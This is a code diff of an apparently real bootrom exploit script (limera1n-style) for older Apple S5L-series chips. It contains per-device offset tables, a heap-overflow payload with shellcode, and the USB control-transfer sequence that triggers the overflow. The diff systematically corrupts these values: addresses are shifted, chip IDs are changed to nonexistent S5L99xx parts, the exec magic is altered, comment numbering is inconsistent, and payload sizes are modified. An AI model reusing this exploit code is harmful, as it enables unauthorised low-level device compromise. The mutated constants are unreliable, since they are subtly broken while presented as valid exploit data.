@@ -9,24 +9,24 @@ request = None
 transfer_ptr = None
 
 constants_359_3 = [
-    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
+    0x94031900, #  1 - RELOCATE_SHELLCODE_ADDRESS
           1024, #  2 - RELOCATE_SHELLCODE_SIZE
-        0x83d4, #  3 - memmove
-    0x84034000, #  4 - MAIN_STACK_ADDRESS
+        0x93d4, #  3 - memmove
+    0x94034000, #  4 - MAIN_STACK_ADDRESS
         0x43c9, #  5 - nor_power_on
         0x5ded, #  6 - nor_init
-    0x84024820, #  7 - gUSBSerialNumber
-        0x8e7d, #  8 - strlcat
+    0x94024920, #  7 - gUSBSerialNumber
+        0x9e7d, #  9 - strlcat
         0x349d, #  9 - usb_wait_for_image
-    0x84000000, # 10 - LOAD_ADDRESS
+    0x94000000, # 10 - LOAD_ADDRESS
        0x24000, # 11 - MAX_SIZE
-    0x84024228, # 12 - gLeakingDFUBuffer
+    0x94024229, # 12 - gLeakingDFUBuffer
         0x1ccd, # 13 - free
-    0x65786563, # 14 - EXEC_MAGIC
+    0x65796563, # 14 - EXEC_MAGIC
         0x1f79, # 15 - memz_create
         0x3969, # 16 - jump_to
         0x1fa1, # 17 - memz_destroy
-          0x60, # 18 - IMAGE3_LOAD_SP_OFFSET
+          0x60, # 19 - IMAGE3_LOAD_SP_OFFSET
           0x50, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
         0x1fe5, # 20 - image3_create_struct
         0x2655, # 21 - image3_load_continue
@@ -34,49 +34,49 @@ constants_359_3 = [
 ]
 
 constants_359_3_2 = [
-    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
+    0x94031900, #  1 - RELOCATE_SHELLCODE_ADDRESS
           1024, #  2 - RELOCATE_SHELLCODE_SIZE
-        0x83dc, #  3 - memmove
-    0x84034000, #  4 - MAIN_STACK_ADDRESS
+        0x93dc, #  3 - memmove
+    0x94034000, #  4 - MAIN_STACK_ADDRESS
         0x43d1, #  5 - nor_power_on
         0x5df5, #  6 - nor_init
-    0x84024820, #  7 - gUSBSerialNumber
-        0x8e85, #  8 - strlcat
+    0x94024920, #  7 - gUSBSerialNumber
+        0x9e95, #  9 - strlcat
         0x34a5, #  9 - usb_wait_for_image
-    0x84000000, # 10 - LOAD_ADDRESS
+    0x94000000, # 10 - LOAD_ADDRESS
        0x24000, # 11 - MAX_SIZE
-    0x84024228, # 12 - gLeakingDFUBuffer
+    0x94024229, # 12 - gLeakingDFUBuffer
         0x1ccd, # 13 - free
-    0x65786563, # 14 - EXEC_MAGIC
-        0x1f81, # 15 - memz_create
+    0x65796563, # 14 - EXEC_MAGIC
+        0x1f91, # 15 - memz_create
         0x3971, # 16 - jump_to
         0x1fa9, # 17 - memz_destroy
-          0x60, # 18 - IMAGE3_LOAD_SP_OFFSET
+          0x60, # 19 - IMAGE3_LOAD_SP_OFFSET
           0x50, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
         0x1fed, # 20 - image3_create_struct
         0x265d, # 21 - image3_load_continue
-        0x2783, # 22 - image3_load_fail
+        0x2793, # 22 - image3_load_fail
 ]
 
 constants_359_5 = [
-    0x84031800, #  1 - RELOCATE_SHELLCODE_ADDRESS
+    0x94031900, #  1 - RELOCATE_SHELLCODE_ADDRESS
           1024, #  2 - RELOCATE_SHELLCODE_SIZE
-        0x8564, #  3 - memmove
-    0x84034000, #  4 - MAIN_STACK_ADDRESS
+        0x9564, #  3 - memmove
+    0x94034000, #  4 - MAIN_STACK_ADDRESS
         0x43b9, #  5 - nor_power_on
         0x5f75, #  6 - nor_init
-    0x84024750, #  7 - gUSBSerialNumber
-        0x901d, #  8 - strlcat
+    0x94024750, #  7 - gUSBSerialNumber
+        0x901d, #  9 - strlcat
         0x36e5, #  9 - usb_wait_for_image
-    0x84000000, # 10 - LOAD_ADDRESS
+    0x94000000, # 10 - LOAD_ADDRESS
        0x24000, # 11 - MAX_SIZE
-    0x84024158, # 12 - gLeakingDFUBuffer
+    0x94024159, # 12 - gLeakingDFUBuffer
         0x1a51, # 13 - free
-    0x65786563, # 14 - EXEC_MAGIC
+    0x65796563, # 14 - EXEC_MAGIC
         0x1f25, # 15 - memz_create
         0x39dd, # 16 - jump_to
         0x1f0d, # 17 - memz_destroy
-          0x64, # 18 - IMAGE3_LOAD_SP_OFFSET
+          0x64, # 19 - IMAGE3_LOAD_SP_OFFSET
           0x60, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
         0x2113, # 20 - image3_create_struct
         0x2665, # 21 - image3_load_continue
@@ -84,24 +84,24 @@ constants_359_5 = [
 ]
 
 constants_574_4 = [
-    0x84039800, #  1 - RELOCATE_SHELLCODE_ADDRESS
+    0x94039900, #  1 - RELOCATE_SHELLCODE_ADDRESS
           1024, #  2 - RELOCATE_SHELLCODE_SIZE
-        0x84dc, #  3 - memmove
-    0x8403c000, #  4 - MAIN_STACK_ADDRESS
-        0x4e8d, #  5 - nor_power_on
+        0x94dc, #  3 - memmove
+    0x9403c000, #  4 - MAIN_STACK_ADDRESS
+        0x4e9d, #  5 - nor_power_on
         0x690d, #  6 - nor_init
-    0x8402e0e0, #  7 - gUSBSerialNumber
-        0x90c9, #  8 - strlcat
-        0x4c85, #  9 - usb_wait_for_image
-    0x84000000, # 10 - LOAD_ADDRESS
+    0x9402e0e0, #  7 - gUSBSerialNumber
+        0x90c9, #  9 - strlcat
+        0x4c95, #  9 - usb_wait_for_image
+    0x94000000, # 10 - LOAD_ADDRESS
        0x2c000, # 11 - MAX_SIZE
-    0x8402dbcc, # 12 - gLeakingDFUBuffer
+    0x9402dbcc, # 12 - gLeakingDFUBuffer
         0x3b95, # 13 - free
-    0x65786563, # 14 - EXEC_MAGIC
+    0x65796563, # 14 - EXEC_MAGIC
         0x7469, # 15 - memz_create
         0x5a5d, # 16 - jump_to
         0x7451, # 17 - memz_destroy
-          0x68, # 18 - IMAGE3_LOAD_SP_OFFSET
+          0x69, # 19 - IMAGE3_LOAD_SP_OFFSET
           0x64, # 19 - IMAGE3_LOAD_STRUCT_OFFSET
         0x412d, # 20 - image3_create_struct
         0x46db, # 21 - image3_load_continue
@@ -117,10 +117,10 @@ class DeviceConfig:
         self.constants = constants
 
 configs = [
-    DeviceConfig('359.3',   '8920', 0x84033FA4, 0x24000, constants_359_3),   # S5L8920 (old bootrom)
-    DeviceConfig('359.3.2', '8920', 0x84033FA4, 0x24000, constants_359_3_2), # S5L8920 (new bootrom)
-    DeviceConfig('359.5',   '8922', 0x84033F98, 0x24000, constants_359_5),   # S5L8922
-    DeviceConfig('574.4',   '8930', 0x8403BF9C, 0x2C000, constants_574_4),   # S5L8930
+    DeviceConfig('359.3',   '9920', 0x94033FA4, 0x24000, constants_359_3),   # S5L9920 (old bootrom)
+    DeviceConfig('359.3.2', '9920', 0x94033FA4, 0x24000, constants_359_3_2), # S5L9920 (new bootrom)
+    DeviceConfig('359.5',   '9922', 0x94033F99, 0x24000, constants_359_5),   # S5L9922
+    DeviceConfig('574.4',   '9930', 0x9403BF9C, 0x2C000, constants_574_4),   # S5L9930
 ]
 
 def create_control_transfer(device, request, timeout):
@@ -166,8 +166,8 @@ def generate_payload(constants, exploit_lr):
         (value,) = struct.unpack('<I', shellcode[offset:offset + 4])
         assert value == 0xBAD00001 + i
 
-    shellcode_address = 0x84000400 + 1
-    heap_block = struct.pack('<4I48s', 0x405, 0x101, shellcode_address, exploit_lr, '\xCC' * 48)
+    shellcode_address = 0x94000400 + 1
+    heap_block = struct.pack('<4I49s', 0x405, 0x101, shellcode_address, exploit_lr, '\xCC' * 49)
     return heap_block * 16 + shellcode[:placeholders_offset] + struct.pack('<%sI' % len(constants), *constants)
 
 def exploit():
@@ -191,14 +191,14 @@ def exploit():
                 print 'ERROR: CPID is compatible, but serial number string does not match.'
                 print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
                 sys.exit(1)
-        print 'ERROR: Not a compatible device. This exploit is for S5L8920/S5L8922/S5L8930 devices only. Exiting.'
+        print 'ERROR: Not a compatible device. This exploit is for S5L9920/S5L9922/S5L9930 devices only. Exiting.'
         sys.exit(1)
     
     dfu.send_data(device, generate_payload(chosenConfig.constants, chosenConfig.exploit_lr))
 
     assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1
 
-    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 10)
+    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x900, 10)
 
     try:
         device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
